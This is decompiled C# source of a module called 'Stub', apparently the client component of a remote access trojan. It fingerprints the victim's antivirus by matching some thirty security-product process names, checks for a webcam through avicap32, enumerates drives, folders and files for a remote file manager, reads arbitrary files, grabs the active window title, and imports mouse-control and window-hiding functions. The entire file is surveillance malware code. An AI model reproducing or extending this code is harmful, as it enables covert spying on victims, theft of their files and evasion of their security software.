using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Stub.My;

namespace Stub
{
	// Token: 0x02000037 RID: 55
	[StandardModule]
	internal sealed class Module1
	{
		// Token: 0x06000139 RID: 313
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

		// Token: 0x0600013A RID: 314 RVA: 0x0000F514 File Offset: 0x0000D714
		public static byte[] SB(string s)
		{
			return Encoding.Default.GetBytes(s);
		}

		// Token: 0x0600013B RID: 315 RVA: 0x0000F534 File Offset: 0x0000D734
		public static string BS(byte[] b)
		{
			return Encoding.Default.GetString(b);
		}

		// Token: 0x0600013C RID: 316 RVA: 0x0000F554 File Offset: 0x0000D754
		public static Array fx(byte[] b, string WRD)
		{
			List<byte[]> list = new List<byte[]>();
			MemoryStream memoryStream = new MemoryStream();
			MemoryStream memoryStream2 = new MemoryStream();
			string[] array = Strings.Split(Module1.BS(b), WRD, -1, CompareMethod.Binary);
			memoryStream.Write(b, 0, array[0].Length);
			checked
			{
				memoryStream2.Write(b, array[0].Length + WRD.Length, b.Length - (array[0].Length + WRD.Length));
				list.Add(memoryStream.ToArray());
				list.Add(memoryStream2.ToArray());
				memoryStream.Dispose();
				memoryStream2.Dispose();
				return list.ToArray();
			}
		}

		// Token: 0x0600013D RID: 317 RVA: 0x0000F5F8 File Offset: 0x0000D7F8
		public static double GetSystemRAMSize()
		{
			double result;
			try
			{
				double num = MyProject.Computer.Info.TotalPhysicalMemory / 1024.0 / 1024.0 / 1024.0;
				result = Conversions.ToDouble(Strings.FormatNumber(num, 2, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault));
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x0600013E RID: 318
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		// Token: 0x0600013F RID: 319
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

		// Token: 0x06000140 RID: 320
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool IsWindowVisible(IntPtr hwnd);

		// Token: 0x06000141 RID: 321
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);

		// Token: 0x06000142 RID: 322
		[DllImport("kernel32.dll")]
		public static extern void Beep(int freq, int dur);

		// Token: 0x06000143 RID: 323 RVA: 0x0000F680 File Offset: 0x0000D880
		public static object getanti()
		{
			Process[] processes = Process.GetProcesses();
			int num = 0;
			checked
			{
				int num2 = processes.Length - 1;
				int num4;
				int num3 = num4 + 1;
				num4 = num;
				string result;
				for (;;)
				{
					int num5 = num3 >> 31 ^ num4;
					int num6 = num3 >> 31 ^ num2;
					if (num5 > num6)
					{
						break;
					}
					string processName = processes[num4].ProcessName;
					bool flag = Operators.CompareString(processName, "ekrn", false) == 0;
					if (flag)
					{
						result = "NOD32";
					}
					else
					{
						flag = (Operators.CompareString(processName, "avgcc", false) == 0);
						if (flag)
						{
							result = "AVG";
						}
						else
						{
							flag = (Operators.CompareString(processName, "avgnt", false) == 0);
							if (flag)
							{
								result = "Avira";
							}
							else
							{
								flag = (Operators.CompareString(processName, "ahnsd", false) == 0);
								if (flag)
								{
									result = "AhnLab-V3";
								}
								else
								{
									flag = (Operators.CompareString(processName, "bdss", false) == 0);
									if (flag)
									{
										result = "BitDefender";
									}
									else
									{
										flag = (Operators.CompareString(processName, "bdv", false) == 0);
										if (flag)
										{
											result = "ByteHero";
										}
										else
										{
											flag = (Operators.CompareString(processName, "clamav", false) == 0);
											if (flag)
											{
												result = "ClamAV";
											}
											else
											{
												flag = (Operators.CompareString(processName, "fpavserver", false) == 0);
												if (flag)
												{
													result = "F-Prot";
												}
												else
												{
													flag = (Operators.CompareString(processName, "fssm32", false) == 0);
													if (flag)
													{
														result = "F-Secure";
													}
													else
													{
														flag = (Operators.CompareString(processName, "avkcl", false) == 0);
														if (flag)
														{
															result = "GData";
														}
														else
														{
															flag = (Operators.CompareString(processName, "engface", false) == 0);
															if (flag)
															{
																result = "Jiangmin";
															}
															else
															{
																flag = (Operators.CompareString(processName, "avp", false) == 0);
																if (flag)
																{
																	result = "Kaspersky";
																}
																else
																{
																	flag = (Operators.CompareString(processName, "updaterui", false) == 0);
																	if (flag)
																	{
																		result = "McAfee";
																	}
																	else
																	{
																		flag = (Operators.CompareString(processName, "msmpeng", false) == 0);
																		if (flag)
																		{
																			result = "microsoft security essentials";
																		}
																		else
																		{
																			flag = (Operators.CompareString(processName, "zanda", false) == 0);
																			if (flag)
																			{
																				result = "Norman";
																			}
																			else
																			{
																				flag = (Operators.CompareString(processName, "npupdate", false) == 0);
																				if (flag)
																				{
																					result = "nProtect";
																				}
																				else
																				{
																					flag = (Operators.CompareString(processName, "inicio", false) == 0);
																					if (flag)
																					{
																						result = "Panda";
																					}
																					else
																					{
																						flag = (Operators.CompareString(processName, "sagui", false) == 0);
																						if (flag)
																						{
																							result = "Prevx";
																						}
																						else
																						{
																							flag = (Operators.CompareString(processName, "Norman", false) == 0);
																							if (flag)
																							{
																								result = "Sophos";
																							}
																							else
																							{
																								flag = (Operators.CompareString(processName, "savservice", false) == 0);
																								if (flag)
																								{
																									result = "Sophos";
																								}
																								else
																								{
																									flag = (Operators.CompareString(processName, "saswinlo", false) == 0);
																									if (flag)
																									{
																										result = "SUPERAntiSpyware";
																									}
																									else
																									{
																										flag = (Operators.CompareString(processName, "spbbcsvc", false) == 0);
																										if (flag)
																										{
																											result = "Symantec";
																										}
																										else
																										{
																											flag = (Operators.CompareString(processName, "thd32", false) == 0);
																											if (flag)
																											{
																												result = "TheHacker";
																											}
																											else
																											{
																												flag = (Operators.CompareString(processName, "ufseagnt", false) == 0);
																												if (flag)
																												{
																													result = "TrendMicro";
																												}
																												else
																												{
																													flag = (Operators.CompareString(processName, "dllhook", false) == 0);
																													if (flag)
																													{
																														result = "VBA32";
																													}
																													else
																													{
																														flag = (Operators.CompareString(processName, "sbamtray", false) == 0);
																														if (flag)
																														{
																															result = "VIPRE";
																														}
																														else
																														{
																															flag = (Operators.CompareString(processName, "vrmonsvc", false) == 0);
																															if (flag)
																															{
																																result = "ViRobot";
																															}
																															else
																															{
																																flag = (Operators.CompareString(processName, "dllhook", false) == 0);
																																if (flag)
																																{
																																	result = "VBA32";
																																}
																																else
																																{
																																	flag = (Operators.CompareString(processName, "vbcalrt", false) == 0);
																																	if (flag)
																																	{
																																		result = "VirusBuster";
																																	}
																																	else
																																	{
																																		flag = (Operators.CompareString(processName, "AvastUI", false) == 0);
																																		if (flag)
																																		{
																																			result = "Avast";
																																		}
																																	}
																																}
																															}
																														}
																													}
																												}
																											}
																										}
																									}
																								}
																							}
																						}
																					}
																				}
																			}
																		}
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
					int id = processes[num4].Id;
					num4 += num3;
				}
				return result;
			}
		}

		// Token: 0x06000144 RID: 324
		[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

		// Token: 0x06000145 RID: 325 RVA: 0x0000FB30 File Offset: 0x0000DD30
		public static string getDrives()
		{
			string text = "";
			try
			{
				foreach (DriveInfo driveInfo in MyProject.Computer.FileSystem.Drives)
				{
					switch (driveInfo.DriveType)
					{
					case DriveType.Fixed:
						text = text + "[Drive]" + driveInfo.Name + "FileManagerSplitFileManagerSplit";
						break;
					case DriveType.CDRom:
						text = text + "[CD]" + driveInfo.Name + "FileManagerSplitFileManagerSplit";
						break;
					}
				}
			}
			finally
			{
				IEnumerator<DriveInfo> enumerator;
				bool flag = enumerator != null;
				if (flag)
				{
					enumerator.Dispose();
				}
			}
			return text;
		}

		// Token: 0x06000146 RID: 326 RVA: 0x0000FC04 File Offset: 0x0000DE04
		public static string readtext(string l)
		{
			return File.ReadAllText(l);
		}

		// Token: 0x06000147 RID: 327 RVA: 0x0000FC20 File Offset: 0x0000DE20
		public static string getFolders(object location)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
			string text = "";
			foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories())
			{
				text = text + "[Folder]" + directoryInfo2.Name + "FileManagerSplitFileManagerSplit";
			}
			return text;
		}

		// Token: 0x06000148 RID: 328 RVA: 0x0000FC88 File Offset: 0x0000DE88
		public static string getFiles(object location)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
			string text = "";
			foreach (FileInfo fileInfo in directoryInfo.GetFiles("*.*"))
			{
				text = string.Concat(new string[]
				{
					text,
					fileInfo.Name,
					"FileManagerSplit",
					fileInfo.Length.ToString(),
					"FileManagerSplit"
				});
			}
			return text;
		}

		// Token: 0x06000149 RID: 329 RVA: 0x0000FD28 File Offset: 0x0000DF28
		public static string checkcam()
		{
			checked
			{
				try
				{
					string text = Strings.Space(100);
					int num = 0;
					for (;;)
					{
						short wDriver = (short)num;
						int cbName = 100;
						string text2 = null;
						bool flag = Module1.capGetDriverDescriptionA(wDriver, ref text, cbName, ref text2, 100);
						if (flag)
						{
							break;
						}
						num++;
						int num2 = num;
						int num3 = 4;
						if (num2 > num3)
						{
							goto Block_3;
						}
					}
					return "Yes";
					Block_3:;
				}
				catch (Exception ex)
				{
				}
				return "No";
			}
		}

		// Token: 0x0600014A RID: 330
		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetForegroundWindow();

		// Token: 0x0600014B RID: 331
		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

		// Token: 0x0600014C RID: 332
		[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextA", ExactSpelling = true, SetLastError = true)]
		public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

		// Token: 0x0600014D RID: 333
		[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextLengthA", ExactSpelling = true, SetLastError = true)]
		public static extern int GetWindowTextLength(long hwnd);

		// Token: 0x0600014E RID: 334 RVA: 0x0000FDAC File Offset: 0x0000DFAC
		public static string ACT()
		{
			checked
			{
				string result;
				try
				{
					IntPtr foregroundWindow = Module1.GetForegroundWindow();
					bool flag = foregroundWindow == IntPtr.Zero;
					if (flag)
					{
						result = "";
					}
					else
					{
						int windowTextLength = Module1.GetWindowTextLength((long)foregroundWindow);
						string text = Strings.StrDup(windowTextLength + 1, "*");
						Module1.GetWindowText(foregroundWindow, ref text, windowTextLength + 1);
						int num;
						Module1.GetWindowThreadProcessId(foregroundWindow, ref num);
						flag = (num == 0);
						if (flag)
						{
							result = text;
						}
						else
						{
							try
							{
								result = Process.GetProcessById(num).MainWindowTitle;
							}
							catch (Exception ex)
							{
								result = text;
							}
						}
					}
				}
				catch (Exception ex2)
				{
					result = "";
				}
				return result;
			}
		}

		// Token: 0x02000038 RID: 56
		public enum SW
		{
			// Token: 0x04000119 RID: 281
			Hide,
			// Token: 0x0400011A RID: 282
			Normal,
			// Token: 0x0400011B RID: 283
			ShowMinimized,
			// Token: 0x0400011C RID: 284
			ShowMaximized,
			// Token: 0x0400011D RID: 285
			ShowNoActivate,
			// Token: 0x0400011E RID: 286
			Show,
			// Token: 0x0400011F RID: 287
			Minimize,
			// Token: 0x04000120 RID: 288
			ShowMinNoActive,
			// Token: 0x04000121 RID: 289
			ShowNA,
			// Token: 0x04000122 RID: 290
			Restore,
			// Token: 0x04000123 RID: 291
			ShowDefault,
			// Token: 0x04000124 RID: 292
			ForceMinimize,
			// Token: 0x04000125 RID: 293
			Max = 11
		}

		// Token: 0x02000039 RID: 57
		public enum GetWindowCmd : uint
		{
			// Token: 0x04000127 RID: 295
			GW_HWNDFIRST,
			// Token: 0x04000128 RID: 296
			GW_HWNDLAST,
			// Token: 0x04000129 RID: 297
			GW_HWNDNEXT,
			// Token: 0x0400012A RID: 298
			GW_HWNDPREV,
			// Token: 0x0400012B RID: 299
			GW_OWNER,
			// Token: 0x0400012C RID: 300
			GW_CHILD,
			// Token: 0x0400012D RID: 301
			GW_ENABLEDPOPUP
		}
	}
}
